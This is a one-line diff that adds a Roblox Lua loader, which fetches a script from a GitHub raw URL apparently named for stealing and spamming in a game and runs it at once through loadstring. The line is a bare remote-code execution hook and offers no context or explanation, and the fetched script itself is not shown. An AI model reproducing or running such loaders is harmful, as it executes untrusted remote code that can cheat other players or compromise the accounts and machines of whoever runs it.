@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/MountainTrackLose/loaders/main/loaders/plant-steal-co-op-spam5-00bckrvwo0xld7.lua"))()
